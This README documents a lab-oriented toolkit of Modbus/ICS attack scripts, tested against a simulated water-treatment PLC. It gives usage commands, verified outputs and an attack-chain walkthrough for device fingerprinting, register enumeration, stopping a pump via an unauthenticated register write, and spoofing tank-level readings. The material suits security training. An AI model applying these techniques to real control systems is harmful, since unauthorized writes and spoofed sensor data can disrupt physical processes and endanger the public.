# OT-toolkit — Modbus/ICS Attack Scripts

Five standalone Python 3 scripts for attacking Modbus TCP devices (PLCs, RTUs,
ICS gateways). No third-party dependencies — pure `socket`/`struct`, so they
run on any Kali box with Python 3, no `pip install` required.

Source: [`AD-Tools/OT-toolkit`](https://github.com/Moh-hatem192/AD-Tools/tree/main/OT-toolkit)
(same repo `htu-ad-setup.sh` already clones for `executables/`, `powershell-scripts/`
and `CVEs/`). The installer fetches all five and puts them on `PATH` — run
`attack_pump.py`, `recon_sweep.py`, etc. from anywhere, no `cd` or `python3` needed.

Tested against the included `vulnerable_plc.py` lab simulator (see below) on
2026-09-22. All five ran correctly; one bug was found and fixed during testing
(see **Known issue** at the bottom).

## The lab target

`vulnerable_plc.py` (bundled in `session-03-lab.zip`, not part of OT-toolkit
itself) simulates a water-treatment-plant PLC speaking raw Modbus TCP on port
502. It's a deliberately-vulnerable training target: no auth, no write
protection, verbose device ID response. Safe to run locally — it never talks
to anything outside your machine.

```bash
python3 vulnerable_plc.py      # needs root/CAP_NET_BIND_SERVICE — port 502 is <1024
```

It logs every request it receives (function code, unit ID, register), and
flags recon/attack-shaped traffic in red so you can watch your own tools get
"caught" in real time.

### Register map (water treatment PLC)

| Register | Name | Normal range | Meaning |
|---|---|---|---|
| 40001 | pump_setpoint | 40-80 | Pump speed % |
| 40002 | tank_level | 30-90 | Water level % |
| 40003 | chlorine_dose | 0.5-2.5 | ppm x10 |
| 40004 | ph_value | 70-80 | pH x10 |
| 40005 | flow_rate | 100-500 | L/min |
| 40006 | temperature | 200-250 | °C x10 |
| 40007 | alarm_high_level | 90 | High-level trip threshold |
| 40008 | alarm_low_level | 20 | Low-level trip threshold |
| 40009 | emergency_stop | 0 | E-stop flag |
| 40010 | valve_inlet | 1 | Inlet valve state |
| 40011 | valve_outlet | 1 | Outlet valve state |
| 40012 | heater_on | 0 | Heater state |
| 40013 | recirc_pump | 1 | Recirculation pump |
| 40014 | backwash_cycle | 0 | Backwash active |
| 40015 | maintenance_mode | 0 | Maintenance mode flag |

Only unit IDs `1` and `255` get a response; anything else is silently ignored.

## The five tools

### `device_fingerprint.py` — FC43 device ID probe

```bash
device_fingerprint.py --target <ip> --port <port>
```

Sends a Modbus **FC43 (Read Device Identification)** request and prints
whatever the device hands back: vendor, product code, firmware revision,
vendor URL, product/model name. This is often the fastest way to identify
exact make/model/firmware on an ICS device for CVE lookup — and it requires
zero authentication, because Modbus has none.

**Verified output** against the lab PLC:
```
[+] Device returned 7 identification objects:
    Vendor Name                  HTU-OT-LAB
    Product Code                 PLC-SIM-3000
    Major/Minor Revision         V1.08
    Vendor URL                   https://ot.null-security.com
    Product Name                 Water Treatment PLC
    Model Name                   Training Lab Unit
    User Application Name        Lab environment only
```
The PLC's own console logs this as `FC43 Device Identification - RECON ACTIVITY`
— confirmed this fires correctly.

### `unit_id_scanner.py` — Modbus Unit ID sweep

```bash
unit_id_scanner.py --target <ip> --port <port>
```

Modbus TCP addresses devices by a **Unit ID** (0-255), a holdover from serial
RTU days where one gateway could front many slave devices. This script probes
all 255 possible IDs with a minimal FC03 read and reports which ones respond
— useful against a gateway that's silently proxying to devices you don't know
about yet.

**Verified output**: found both configured IDs (`1` and `255`) correctly,
full sweep in well under a second.

### `recon_sweep.py` — register enumeration

```bash
recon_sweep.py --target <ip> --port <port> [--start N] [--end N]
```

Walks holding-register addresses one at a time (`--start`/`--end`, default
covers a reasonable range) and reports every address that returns a
non-error, non-zero-looking value. This is how you build the register map
for a device with no public documentation — find what's *there* before you
guess what it *means*.

**Verified output**: found all 15 active registers (40001-40015) with
correct live values on a `--start 0 --end 100` sweep.

> **Tip for temporal correlation** (from the original lab exercise): loop
> `recon_sweep.py` every couple of seconds and diff the results. Registers
> that oscillate are process variables (flow, temperature); registers that
> never move are setpoints/thresholds; registers that only ever flip between
> two values are state flags (valves, alarms, modes).

### `attack_pump.py` — write to a safety-critical register

```bash
attack_pump.py --target <ip> --port <port> [--value N]
```

Reads the current `pump_setpoint` (40001), writes a new value (default `0`,
i.e. stop the pump) via FC06, then reads it back to confirm the write stuck.
No authentication, no confirmation prompt on the PLC side — this is the
entire "attack" a real intrusion would need.

**Verified output**:
```
[2] Writing new value 0 to 40001...
    Write confirmed by PLC - no authentication required
[+] ATTACK SUCCESSFUL
    Pump setpoint changed from 52 to 0
```
PLC console logged: `FC06 Write Register: pump_setpoint(40001) 52 -> 0` followed
by `CRITICAL: Write to safety-sensitive register!` — confirmed the write and
the PLC's own severity flagging both fire correctly.

### `sensor_spoof.py` — sustained sensor spoofing

```bash
sensor_spoof.py --target <ip> --port <port> [--fake-level N] [--duration N]
```

Repeatedly overwrites `tank_level` (40002) with a fixed fake value once per
second for `--duration` seconds — simulating an attacker masking the real
process state from an HMI/operator while whatever is actually happening
(overflow, dry-run, etc.) goes unseen. This is the classic "the screen says
everything's fine" ICS attack pattern.

**Verified output**: ran cleanly for a shortened 5-second test, issued one
write per second, printed a running counter, PLC log showed the repeated
`FC06 Write Register: tank_level ...` writes as expected.

## Recommended attack-chain walkthrough

```bash
# Terminal 1
python3 vulnerable_plc.py

# Terminal 2
nmap -sV -p 502 localhost
nmap --script modbus-discover -p 502 localhost   # see note below

device_fingerprint.py --target localhost --port 502
unit_id_scanner.py --target localhost --port 502
recon_sweep.py --target localhost --port 502 --start 0 --end 100

# guess which register is what before checking the register map above,
# then confirm by watching values change over ~30s of repeated recon_sweep.py

attack_pump.py --target localhost --port 502 --value 0
sensor_spoof.py --target localhost --port 502 --fake-level 55 --duration 30
```

**Note on `modbus-discover`**: the NSE script only fires against port `502`
or a port nmap has already fingerprinted as the `modbus` service — it will
silently do nothing on a non-standard port. This isn't a bug in the lab or
the toolkit, it's how the script's `portrule` is written; not an issue in the
normal case, since the lab (and real Modbus devices) use 502.

## Known issue (fixed locally, not yet upstream)

**`sensor_spoof.py` crashes on Python 3.13+** with `ValueError: unsupported
format character 't'`. Cause: its `--fake-level` argparse help string contains
a literal `Fake tank level % to display` — argparse's `HelpFormatter` treats
`%` as the start of a printf-style directive (for things like `%(default)s`),
and newer Python validates help strings eagerly at `add_argument()` time
instead of only when `--help` is actually invoked, so the bad string now
crashes immediately instead of silently working.

**Fix**: escape the literal percent as `%%`:
```diff
- p.add_argument('--fake-level', type=int, default=55, help='Fake tank level % to display')
+ p.add_argument('--fake-level', type=int, default=55, help='Fake tank level %% to display')
```

This was fixed in the local copy used for testing. **The copy in the
`AD-Tools` GitHub repo (`OT-toolkit/sensor_spoof.py`) still has the original
bug** as of this writing — `htu-ad-setup.sh` installs straight from that repo,
so it will ship broken until the repo's copy is patched the same way.
